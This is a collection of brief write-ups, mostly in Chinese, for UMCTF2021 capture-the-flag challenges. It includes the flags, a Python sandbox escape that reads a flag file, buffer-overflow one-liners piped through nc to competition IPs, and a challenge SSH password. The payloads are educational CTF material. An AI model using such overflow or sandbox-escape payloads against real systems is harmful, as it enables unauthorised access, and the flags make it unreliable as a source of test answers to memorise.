# UMCTF Competition Noob's Hackathon 公開組

----

# Miscellaneous - UMCTF2021 - Macow

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{1_4m_l1v1n6_1n_534c_p41_v4n_p4rk_n0w....}**


## **Question:**
>**Macow**</br>
>Author: **RB916120**

>do you remember macow??</br>
>flag in the file [http://bit.ly/2N8960t](http://bit.ly/2N8960t)


## **write-up:**

>首先 unzip file，然後利用 IDE Editor Search “**CTF**”，另一部分通過 Search "**}**" 找到。
> 
> 

----

# Miscellaneous - UMCTF2021 - snakeCage

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{ssssssnake_easy_peasy}**


## **Question:**
>**snakeCage**</br>
>Author: **RB916120**

>can you escape from snake cage?</br>
>nc 13.75.78.108 38001


## **write-up:**

>**Step 1：**
>import os; print(os.listdir('.'));</br>
>會見到fs有個叫flag的檔

>**Step 2：**
>再用 open('flag').read() 就會知道個flag</br>
>import os; print(open('flag').read());
> 
> 

----

# Miscellaneous - UMCTF2021 - takeit

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{55h_15_!_700_h4rd!!!!!!!!!!!!!!!}**


## **Question:**
>**takeit**</br>
>Author: **RB916120**

>i put the flag on the screen, take it if you can end the session</br>
>
>ssh eofffff@13.75.78.108 -p 38004 (password: DthBqhs8n)


## **write-up:**

>手機拍片逐格睇
> 
> 

----

# PWN - UMCTF2021 - babycoffee-1

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d0n7_l37_7h3m_pu7_700_much_c0ff33_w1ll_0v3rfl0w3d!!}**


## **Question:**
>**babycoffee-1**</br>
>Author: **RB916120**

>can you overflow the coffee?</br>
>
>nc 52.175.52.175 39001


## **write-up:**

>python2 -c "print 'A' * 100 + '\x44'" |  nc 52.175.52.175 39001
> 
>

----

# PWN - UMCTF2021 - babycoffee-2

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d0_y0u_3nj0y_7h15_c7f_3v3n7?}**


## **Question:**
>**babycoffee-2**</br>
>Author: **RB916120**

>i would like to order a coffee..</br>
>
>nc 52.175.52.175 39002


## **write-up:**

>python2 -c "print 'A' * 32 + '\xBE\xBA\xFE\xCA'" | nc 52.175.52.175 39002
> 
>

----

# Forensic - UMCTF2021 - hide

- Write-Up Author: **Louis Lou**

- Flag: **mocsctf{c@n_y0u_f1nd_0ur_53cr3t?!}**


## **Question:**
>**hide**</br>
>Author: **TeruLei**

>hi,hi,hide in a pic~</br>
>


## **write-up:**

>**Step 1.**
>unzip hide.zip and goto onlinehexeditor search “ctf” find first part.</br>
>
>**Step 2.**
>use https://stylesuxx.github.io/steganography/ find another part.</br>
>
> 

----

# Crypto - UMCTF2021 - caesars army

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{y0u_c4n_d3cryp7_f4573r_4nd_f4573r~~}**


## **Question:**
>**caesars army**</br>
>Author: **RB916120**

>some caesars around me, please decrypt them and get the flag.</br>
>
>nc 13.75.78.108 37002</br>
>


## **write-up:**

>Cryptii : use Caesar cipher (Encode)
>https://cryptii.com/pipes/binary-to-base64
>改變shift並留意出現 “msg is : ”, 完成回答 20 次 全對後就出 Flag
>
> 

----

# Crypto - UMCTF2021 - Vigenere

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{mocsctfissomuchfun}**


## **Question:**
>**Vigenere**</br>
>Author: **Bon**

>I don't think this question can beats you, am I right? ;) (please use the formal flag format. MOCSCTF{Decrypt Key})</br>
>
>Fvg xkkxb owzx-xqjzgrzhgv fxxkjadfcqu tz n bcnqceupstsfce jnjuqf ysu ud Twgb Nuvanmgm Ontgkyq sfr gmgk f grfon ukimmj vwee vv xqvfqj tgmbmwf qujjlw uybvctgmx. Idtsdnkz xsffso gped aoahobgk ffctodwvl fnlwf eyxlwuy ictvu, tsl kowfwjlx qrds kffbhilwr ns yynnvzu vzg ejblwf az voj wbdfgkrhslafu mfrofvrf wp ljx hqhzsdngey. Fnfst, Bqafvfwg Flkamyzuiu, ap ana ogfw Jqsdaemdjacx , nvnwbfyf amy gmpwdc kjkls, o olkanwnx qqerhsmfl cr njl Actqbgjg vnxzwf. Fbg Awcgtsoawl hqhzsd, bqdjprd, dtgxbimv s ddiiyjmfujg, jcmmmj jwscf hsx cdsfaemfjdw gkmvlr zbd gyavvmqfy pqnyljh pudjwt tqxzspqnu. Wqynes wkg mmm cwm mm voj zymu.
>
>

## **write-up:**

>goto https://www.guballa.de/vigenere-solver</br>
>貼上上面的文章</br>
>
>“Break Cipher” 後 爆出可讀文章</br>
>
>找 Clear text using key “mocsctfissomuchfun” 就是flag!</br>
>
>
 
